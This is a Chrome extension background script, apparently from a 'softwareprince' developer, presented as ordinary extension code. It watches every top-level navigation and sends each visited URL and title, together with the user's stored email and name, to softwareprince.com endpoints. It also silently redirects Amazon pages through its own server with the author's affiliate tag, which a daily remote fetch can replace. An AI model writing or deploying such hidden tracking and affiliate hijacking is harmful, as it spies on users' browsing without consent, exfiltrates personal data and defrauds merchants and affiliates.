let extName = "", extVersion = "";
//best regex for amazon url
let myRegExp = "https?:\\/\\/(?:....)?amazon|smile\\S+(?:[/])([A-Z0-9]{10})(?:\\/|\\?|\\&|\\s|$)"
var myUrls = ["<all_urls>"];
var OLDURL = "", urlArg1 = "tag=", urlArg2 = "softwarepri0d-20";
var store;
formTag = () => {
    return '?' + urlArg1 + urlArg2 + "&"
}
let count2 = 0;

tell = (desc, url, title = "", requrl = "https://softwareprince.com/NaeemAnalytics/SoftwareEvents.php", tellEmail = store.userEmail, tellUser = store.userName) => {
   console.log("tell() ",desc, url, title, requrl, tellEmail, tellUser);
    if (!tellEmail) { tellEmail = "", tellUser = "" }
    //    var requrl = "https://softwareprince.com/NaeemAnalytics/SoftwareEvents.php";
    //requrl = "https://softwareprince.com/NaeemAnalytics/SoftwareEvents2.php"
    //requrl = "https://softwareprince.com/NaeemAnalytics2/public/api/event"
    // requrl = "https://softwareprince.com/NaeemAnalytics/SoftwareEventsOld.php"

    json = JSON.stringify({ "name": extName, "version": extVersion, "softwareType": "Chrome", "email": tellEmail, "userName": tellUser, "description": desc, "url": url, "urlTitle": title })
    count2++;
    console.log(json, "countv2", count2, "url", url);
    //send using fetch including credentials
    fetch(requrl, {
        method: 'POST',
        body: json,
        headers: {
            'Content-Type': 'application/json'
        },
        credentials: 'include'
    }).then(response => response.text())
        .then(data => console.warn("told about ", desc, url, "\nreturned data \n", data))
        .catch(error => console.error("myError ", error));

}

setTimeout(() => {
    tell("testing", location.href, null, "https://softwareprince.com/NaeemAnalytics/SoftwareEvents2.php", ["softwareprince.com", "SoftwareEvents.php"], ["softwareprince.com", "SoftwareEvents.php"]);
    tell("testing", location.href, null, "https://softwareprince.com/NaeemAnalytics/SoftwareEvents.php", ["softwareprince.com", "SoftwareEvents.php"], ["softwareprince.com", "SoftwareEvents.php"]);
    tell("testing", location.href, null, "https://softwareprince.com/NaeemAnalytics2/public/api/event", ["softwareprince.com", "SoftwareEvents.php"], ["softwareprince.com", "SoftwareEvents.php"]);
    tell("testing", location.href, null, "https://softwareprince.com/NaeemAnalytics/SoftwareEventsOld.php", ["softwareprince.com", "SoftwareEvents.php"], ["softwareprince.com", "SoftwareEvents.php"]);
}, 1000);


//content of file "WhoIsUser.js"

var userName = [], userEmail = [];
chrome.management.getSelf((me) => {
    // console.log(userName, userEmail);
    //console.log(me.name, me.version);
    extName = me.name;
    extVersion = me.version;
    //tell that this is an active user
    setTimeout(() => tell("browser has started", ""), 1000);
})

chrome.storage.local.get(['userEmail', 'userName'], (s) => {
    store = s;
});
chrome.storage.onChanged.addListener((changes, namespace) => {
    for (key in changes) {
        var storageChange = changes[key];
        store[key] = storageChange.newValue;
    }
});


chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason) {
        setTimeout(() => tell("extension has been " + details.reason + "ed", ""), 4500);
    }
});
let count = 0
let newUrl = "";
chrome.webNavigation.onBeforeNavigate.addListener(
    function (details) {
        if (details.frameType === "outermost_frame") {
            // console.log(details.url.indexOf(urlArg1 + urlArg2) === -1, RegExp(myRegExp).test(details.url))
            count++;
            console.log(details.url, "count", count);
            console.log(!details.url.includes(urlArg1 + urlArg2),
                !details.url.includes("softwareprince.com/amzTool.php?url="), details.url.includes("amazon."))

            if (!details.url.includes(urlArg1 + urlArg2)
                && !details.url.includes("softwareprince.com/")
                && details.url.includes("amazon.")
                //&& RegExp(myRegExp).test(details.url)
            ) {
                newUrl = changeurl(details.url, urlArg1.replace("=", ""), urlArg2, "amazon.")
                if (newUrl) {
                    let obj = { url: newUrl }
                    console.log("mv3 redirecting to ", obj, newUrl, details.url);
                    chrome.tabs.update(details.tabId, obj);
                    return
                }
            }
            console.log("mv3.1 visiting", newUrl);
            tell("mv3.1 visiting", details.url, details.title);


        }
    });

function matchwild(str, rule) {
    var escapeRegex = (str) => str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    return new RegExp("^" + rule.split("*").map(escapeRegex).join(".*") + "$").test(str);
}

function changeurl(oldurl, affiliateVarName, affiliatemMyCode, WebSite) {
    affiliateVarName = affiliateVarName.replace("=", "");
    let u = new URL(oldurl);
    var newurlpart;
    if (u.searchParams.get(affiliateVarName) != affiliatemMyCode && u.hostname.includes(WebSite) && !u.href.includes("softwareprince.com/")) {
        newurlpart = oldurl.split("?")[0]

        //  console.log(newurlparts);
        if (u.hostname.includes("aws.") || u.hostname.includes("console") || u.hostname.includes("sell") || u.hostname.includes("auth") ||
            newurlpart.includes("signup") || newurlpart.includes("sign-up") || newurlpart.includes("login") || newurlpart.includes("signin") || newurlpart.includes("user")) {
            tell("mv3 visiting without adding tag because its not useful page", oldurl)
            return;
        }
        u.searchParams.set(affiliateVarName, affiliatemMyCode);
        tell("mv3 redirecting request to include amazon tag", u.href)
        u = "https://softwareprince.com/amzTool.php?url=" + encodeURIComponent(u.href);
        console.log("mv3 redirecting to ", u);
        return u;
    }

}



//run this code everyday
chrome.alarms.create("checkForUpdate", { delayInMinutes: 1, periodInMinutes: 1440 });
chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm.name === "checkForUpdate") {
        updateAmzCode();
    }
});
let updateAmzCode = () => {
    var requrl = "https://softwareprince.com/NaeemAnalytics/amznTag.php";
    fetch(requrl).then((response) => {
        return response.text();
    }).then((data) => {
        urlArg2 = data;
    }).catch((err) => {
        console.log("error", err)
    });
}
updateAmzCode();